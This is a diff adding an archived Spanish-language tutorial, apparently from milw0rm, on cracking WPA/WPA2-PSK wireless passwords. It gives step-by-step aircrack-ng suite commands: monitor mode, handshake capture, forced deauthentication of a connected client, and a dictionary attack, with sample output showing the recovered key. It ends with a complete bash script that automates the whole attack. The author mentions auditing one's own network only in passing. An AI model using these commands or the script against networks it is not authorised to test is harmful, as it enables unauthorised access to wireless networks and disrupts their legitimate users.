@@ -1,0 +1,320 @@
+<html>
+<head>
+<title>[spanish] Cracking WPA/WPA2-PSK with wordlist</title>
+<pre>
+
+-[ INFORMACIÓN ]---------------------------------------------------------------------
+
+	Titulo: Cracking WPA/WPA2-PSK with wordlist
+	Autor: ka0x
+	Contacto: ka0x01[alt+64]gmail.com
+	Fecha: 08/03/2009
+
+---------------------------------------------------------------------------------
+
+
+-[ ÍNDICE ]---------------------------------------------------------------------
+
+	0x01: Introducción
+	0x02: ¿Qué es el handshake?
+	0x03: Capturando handshake
+	0x04: Conseguir clave con diccionario
+	0x05: airoWPA-PSK.sh
+	0x06: Fin
+
+---------------------------------------------------------------------------------
+
+
+---[ 0x01: Introducción ]
+
+En este pequeño texto se explicará como obtener la clave de una red inalámbrica con cifrado WPA/WP2
+en la que se esté usando un sistema de clave compartida (pre-shared keys - PSK).
+Para todo esto necesitaremos capturar un handshake y después con un diccionario atacar al handshake
+para obtener la clave.
+
+Imaginemos que en este caso tenemos la siguiente red inalambrica:
+
+- ESSID: ap_labs
+- BSSID: 00:1B:02:93:AF:9C
+- CANAL: 1
+- CLIENTE: 01:C2:B3:04:02:05
+
+
+---[ 0x02: ¿Qué es el handshake? ]
+
+Pues el handshake se genera cuando un cliente se asocia a la red inalámbrica,
+es como un saludo (apretón de manos) entre el punto de acceso y el cliente.
+Son los paquetes que se envían entre el AP y el cliente en el momento de la asociación.
+para que podamos empezar el ataque con diccionario en una red con cifrado WPA-PSK, necesitaremos haber
+capturado estos paquetes.
+
+---------------------------------------------------------------------------------
+
+
+
+---[ 0x03: Capturando handshake ]
+
+Bueno empecemos...
+Utilizamores la suite de aircrack-ng,  si queremos los sources y demás
+podemos entrar a su web: http://www.aircrack-ng.org/doku.php#download
+
+Si utilizamos debian, encontraremos el paquete en los repositorios, instalar:
+# apt-get install aircrack-ng
+
+Para poder capturar paquetes, tendremos que poner nuestro adaptador wireles en modo monitor:
+
+# airmon-ng start &lt;iface&gt;
+p.e: # airmon-ng start wlan0
+
+
+Siempre se necesitará tener un cliente 'real' asociado en el AP.
+Entonces una vez para empezar a capturar paquetes, utilizaremos airodump-ng:
+
+# airodump-ng --bssid 00:1B:02:93:AF:9C -c 1 -w redWPA wlan0
+	--bssid -&gt; MAC del punto de acceso.
+	-w redWPA -&gt; guardará los datos obtenidos en el archivo &quot;redWPA&quot;.
+	-c -&gt; Canal del punto de acesso
+	wlan0 -&gt; interfaz adaptador inalambrico.
+
+Así capturaremos todo lo que pase por el punto de acceso con MAC: 00:1B:02:93:AF:9C
+Entonces vayamos a capturar el handshake...
+
+
+Como habíamos dicho antes el handshake se genera en el momento que un cliente se asocia al AP.
+Entonces, cómo hacemos que se vuelva asociar el cliente al AP?
+
+Facil, desautenticaremos al cliente del AP y esperamos a que se vuelva asociar,
+para este proceso usaremos el ataque 0 de aireplay-ng. Este ataque enviará al cliente paquetes de
+desautenticacion
+
+Uso:
+# aireplay-ng -0 5 -a &lt;MAC_AP&gt; -c &lt;MAC_CLIENTE&gt; &lt;interfaz&gt;
+		 |-&gt; Numero de desautenticaciones que se enviarán.
+		     Si ponemos un 0, enviará desautenticaciones hasta que lo paremos.
+
+En este caso:
+# aireplay-ng -0 15 -a 00:1B:02:93:AF:9C -c 01:C2:B3:04:02:05 wlan0
+
+Cuando ejecutemos esto segun el numero de desautenticaciones nos aparecerá algo así:
+Sending DeAuth to station   -- STMAC: [01:C2:B3:04:02:05]
+
+En el momento que el cliente se desasocie y se vuelva a asociar al AP, nosotros con el airodump-ng
+capturaremos el handshake.
+
+¿Cómo sabemos que ya lo hemos capturado?
+
+Pues en la ventana donde tenemos corriendo el airodump-ng, arriba a la derecha, veremos algo así:
+CH 1 ] [ Elapsed: 14 mins ][ 2009-03-08 ][ WPA handshake: 00:1B:02:93:AF:9C
+
+Una vez que nos aparezca eso, ya podemos cerrar todo, en el archivo redWPA-01.cap ya tendremos
+el dichoso handshake =)
+
+---------------------------------------------------------------------------------
+
+
+---[ 0x04: Conseguir clave con diccionario ]
+
+
+Una vez teniendo el handshake, ya podemos utilizar un diccionario de posibles claves
+para que aircrack-ng compruebe haber si alguna de las claves del diccionario coincide
+con la del AP.
+
+¿Qué diccionario usar? pues el de john the ripper, alguno propio, hay muchos...
+aunque se supone que esto es para comprobar la seguridad de tu red wireless y ya te tendrás
+que saber de sobra tu clave.
+
+La clave pre-compartida puede tener un tamaño de 8 a 63 caracteres.
+
+Empecemos...
+
+Si ejecutamos:
+# aircrack-ng redWPA-01.cap
+
+Podremos ver que tenemos un handshake:
+
+---------
+Opening wpa-hand.cap
+Read 553 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  00:1B:02:93:AF:9C  ap_labs                WPA (1 handshake)  &lt;------
+
+Choosing first network as target.
+
+Opening wpa-hand.cap
+Please specify a dictionary (option -w).
+
+
+Quitting aircrack-ng...
+---------
+
+Uso de aircrack-ng con diccionario:
+# aircrack-ng -w &lt;ruta_diccionario&gt; &lt;archivo_de_capturas&gt;
+
+
+Suponiendo que nuestro archivo de datos capturados donde se encuentra el handshake se llama
+redWPA-01.cap, lo ejecutaremos de la siguiente forma:
+
+
+# aircrack-ng -w diccionario.lst redWPA-01.cap
+
+Entonces aquí ya aircrack-ng se pondrá a comprobar las posibles claves del diccionario hasta obtenerla.
+Una vez obtenida, nos aparecerá lo siguiente:
+
+---------
+
+                                 Aircrack-ng 1.0 rc1
+
+
+                   [00:00:00] 0 keys tested (0.00 k/s)
+
+
+                           KEY FOUND! [ clave__ap ]
+
+
+      Master Key     : 18 D4 E8 70 A0 B5 D2 26 4C 61 BA 85 5F 36 8F D9 
+                       DA 56 2A D2 51 B6 01 B6 A9 E8 61 B3 CD 92 7D 09 
+
+      Transcient Key : DA 5E 56 09 35 9E 2D 9F 35 B0 C5 9E A9 41 71 B5 
+                       8A 8C B6 1B B5 A0 D2 C0 53 47 C6 05 CC 2C CA C0 
+                       C7 41 04 B2 F5 7D 44 DF 71 C5 11 78 5D DE A1 D0 
+                       F9 2E BE 54 22 46 82 24 35 91 7E 93 21 9D BF 78 
+
+      EAPOL HMAC     : 6A 31 F7 C0 C8 A7 83 37 50 FD 44 C3 8C 7D 2B 26
+
+---------
+
+Hay ya vemos que encontro la clave y que es 'clave__ap'.
+Como vemos el proceso de obtener una clave WPA/WPA2-PSK no es tan dificil siempre y cuando
+sepamos nuestra clave, ya que si no la sabríamos este proceso podría durar horas, dias e incluso semanas
+depende el diccionario que usemos.
+
+---------------------------------------------------------------------------------
+
+
+
+---[ 0x05: airoWPA-PSH.sh ]
+
+Para simplificar un poco este proceso de obtención de la clave, hice un pequeño script en bash
+sencillo que te puede servir si eres un poco vago :P
+
+&lt;-----------------airoWPA-PSK.sh---------------------&gt;
+#!/bin/bash
+
+# airoWPA-PSK.sh v0.1
+# written by ka0x &lt;ka0x01[at]gmail.com&gt;
+
+if [ $UID != 0 ]; then
+	echo &quot;[!] NECESITAS EJECUTAR EL SCRIPT $0 CON PRIVILEJIOS DE SUPERUSUARIO&quot;
+	exit
+fi
+
+comprueba_mac(){
+	if [ ! &quot;${#1}&quot; -eq &quot;17&quot; ]; then
+		echo -e &quot;\033[31mMac Incorrecta\n\033[0m&quot;
+		exit
+	fi
+}
+interfaces() {
+	echo -e &quot;\n\033[31m[*] Seleccione la interfaz que va a utilizar: \033[0m\n&quot;
+	INTERFACES=$(iwconfig | grep ESSID | awk '{ print $1 }')
+	select INTER in $INTERFACES; do
+		break;
+	done
+	clear
+}
+
+monitor(){
+	airmon-ng start $INTER
+	clear
+	menu
+}
+
+handshake(){
+	clear
+	read -p &quot;[-] Introduzca la MAC del AP: &quot; mac_ap
+	comprueba_mac $mac_ap
+	read -p &quot;[-] Introduzca la MAC del Cliente: &quot; mac_client
+	comprueba_mac $mac_client
+	read -p &quot;[-] Introduzca el canal del AP: &quot; mac_chanel
+	read -p &quot;[-] Nombre de archivo donde se guardaran los datos capturados: &quot; datas
+	xterm -hold -title &quot;Obteniendo Handshake en $mac_ap&quot; -geometry 96x60+0+0 -bg &quot;#000000&quot; -fg &quot;#FFFFFF&quot; -e airodump-ng --bssid $mac_ap -c $mac_chanel -w $datas $INTER &amp;&amp; clear &amp;&amp; menu
+}
+
+desautenticacion(){
+	clear
+	read -p &quot;[-] Introduzca la MAC del AP: &quot; mac_ap
+	comprueba_mac $mac_ap
+	read -p &quot;[-] Introduzca la MAC del cliente asociado: &quot; mac_cliente
+	comprueba_mac $mac_cliente
+	read -p &quot;[-] Introduzca el numero de desautenticaciones: &quot; num
+	xterm -hold -geometry 70x25-0+0 -bg &quot;#000000&quot; -fg &quot;#99CCFF&quot; -title &quot;Desautenticando $mac_cliente del AP $mac_ap $num veces&quot; -e aireplay-ng -0 $num -a $mac_ap -c $mac_cliente $INTER
+	clear
+	menu
+}
+
+crack_dicc(){
+	clear
+	read -p &quot;[-] Introduzca la ruta del diccionario: &quot; diccionario
+	echo &quot;[-] Seleccione el archivo de datos capturados:&quot;
+
+	LS_DIR=$(ls *.cap)
+	select DATA in $LS_DIR; do
+		break;
+	done
+	
+	xterm -hold -geometry 70x25-0+0 -bg &quot;#000000&quot; -fg &quot;#99CCFF&quot; -title &quot;Obteniendo clave con diccionario: $diccionario&quot; -hold -e aircrack-ng -w $diccionario $DATA
+	menu
+}
+
+menu(){
+	echo -e &quot;\n[*] Opciones:\n&quot;
+	echo -e &quot;\033[31m-=-=-=-=-=-=-=-=-=-=-=-=-\033[0m&quot;
+	echo &quot;1 - Activar Modo Monitor&quot;
+	echo &quot;2 - Capturar handshake&quot;
+	echo &quot;3 - Desautenticar cliente&quot;
+	echo &quot;4 - Obtener clave con diccionario&quot;
+	echo &quot;5 - Salir&quot;
+	echo -e &quot;\033[31m-=-=-=-=-=-=-=-=-=-=-=-=-\n\033[0m&quot;
+
+	read -p &quot;opcion&gt; &quot; OPCION
+
+	case $OPCION in
+		&quot;1&quot;) monitor;;
+		&quot;2&quot;) handshake;;
+		&quot;3&quot;) desautenticacion;;
+		&quot;4&quot;) crack_dicc;;
+		&quot;5&quot;) exit;;
+	*) echo -e &quot;\033[31m[!] OPCION NO VALIDA\n\033[0m&quot; &amp;&amp; menu;;
+
+	esac
+}
+
+interfaces
+menu
+
+# __EOF__
+&lt;------------------------------------------------&gt;
+
+---------------------------------------------------------------------------------
+
+
+---[ 0x06: Fin ]
+
+Bueno pues eso es todo, los pasos son bastantes sencillos, cualquier duda pueden
+entrar a la web de aircrack-ng (http//www.aircrack-ng.org) donde podrán encontrar abundante documentación
+o mismamente enviándome un email.
+
+Espero que se entienda.
+
+Un saludo!
+
+# ka0x
+
+---------------------------------------------------------------------------------
+
+__EOF__
+
+# milw0rm.com [2009-03-09]</pre>
+</html>
